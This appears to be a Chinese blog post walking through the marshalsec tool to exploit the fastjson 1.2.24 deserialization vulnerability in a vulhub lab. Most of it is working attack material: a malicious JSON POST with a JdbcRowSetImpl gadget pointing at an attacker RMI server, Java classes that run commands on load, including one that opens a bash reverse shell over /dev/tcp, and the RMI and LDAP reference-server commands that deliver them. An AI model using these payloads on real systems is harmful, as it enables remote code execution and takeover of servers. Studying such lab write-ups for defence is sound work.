---
title:  "marshalsec使用"
excerpt: "marshalsec使用"
author: "lcc"
layout: single
tags:
  - 早期文档
categories:
  - web安全
---
# marshalsec使用

## start

- 下载项目：https://github.com/mbechler/marshalsec

- 下载jdk8，我的jd8版本是jdk8u202

- 构建项目得到jar包

  ```
  mvn clean package -DskipTests
  ```

- 然后install生成jar包

在完成marshalsec jar包的生成后，将以一个实例表明如何使用marshalsec。



## 实例



### fastjson 1.2.24 反序列化导致任意命令执行漏洞

环境：vulhub中的fastjson 1.2.24 反序列化导致任意命令执行漏洞，java版本是`1.8.0_102-8u102`

在完成docker镜像的启动后，对涉及的以下ip进行说明：

```
172.18.0.2：靶机
192.168.141.166：恶意的http服务器
192.168.141.91：恶意的RMI服务器
```

接下来描述整个攻击流程：

1. 作为一个hacker，已知目标接口存在fastjson 1.2.24 反序列化漏洞，我准备了一个恶意的POST包

   ```
   POST / HTTP/1.1
   Host: 192.168.141.166:8090
   Accept-Encoding: gzip, deflate
   Accept: */*
   Accept-Language: en
   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
   Connection: close
   Content-Type: application/json
   Content-Length: 160
   
   {
       "b":{
           "@type":"com.sun.rowset.JdbcRowSetImpl",
           "dataSourceName":"rmi://192.168.141.91/TouchFile",
           "autoCommit":true
       }
   }
   ```

2. 然后我准备一个恶意的class，使用java 8去编译成class文件

   ```java
   import java.lang.Runtime;
   import java.lang.Process;
   
   public class TouchFile {
       static {
           try {
               Runtime rt = Runtime.getRuntime();
               String[] commands = {"touch", "/tmp/success"};
               Process pc = rt.exec(commands);
               pc.waitFor();
           } catch (Exception e) {
               // do nothing
           }
       }
   }
   ```

   将准备好的class文件放到http服务器（`192.168.141.166`）上，再使用python开启了一个简易的http服务器

   ```
   python3 -m http.server 8080
   ```

3. 接着我在RMI服务器（`192.168.141.91`）上执行命令

   ```
   D:\java\jdk8\bin\java.exe -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.141.166:8080/#TouchFile 1099
   ```

   `http://192.168.141.166:8080/#TouchFile`用于告诉靶机应该从哪引用对象，1099则是RMI服务器监听的端口，这是RMI协议的默认端口

4. 最后我发送步骤1中的数据包从而执行了`touch /tmp/success`

整个过程其实有点绕，但简单来说就是：当我向靶机发送恶意请求包，靶机通过RMI协议从RMI服务器查一个对象，然后RMI服务器返回了一个引用告诉靶机从哪取这个对象，靶机然后就去http服务器取了这个对象，而这个恶意的对象通过反序列化漏洞执行了恶意代码



这是一个可以成功反弹shell的恶意类：

```
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/192.168.141.125/5000 0>&1"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

```

使用LDAP则是类似的，只需替换步骤1中的dataSourceName为`ldap://192.168.141.91:1389/TouchFile`即可



- 参数解释

  - -a：生成指定marshaller的所有payload
  - -t：以测试模式运行，在生成payload后立即对其进行反序列化测试
  - -v：详细模式
  - gadget_type：指定要使用的gadget 类型

- 使用marshaller生成payload

  ```
  D:\java\jdk8\bin\java.exe -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Jackson -a exploit.exec="calc"
  ```

- 启动一个RMI服务，该服务在恶意服务器上运行

  ```
  D:\java\jdk8\bin\java.exe -cp target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://192.168.141.166:8080/#TouchFile 1099
  ```

- 借助反序列化漏洞植入url

  ```
  rmi://127.0.0.1:1099/ExportObject
  ```

  这样，一旦触发反序列化漏洞就会导致拥有反序列化漏洞的服务器被控制

- 生成payload

  ```
  D:\java\jdk8\bin\java.exe -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.141.166:8080/#TouchFile 1389
  ```

  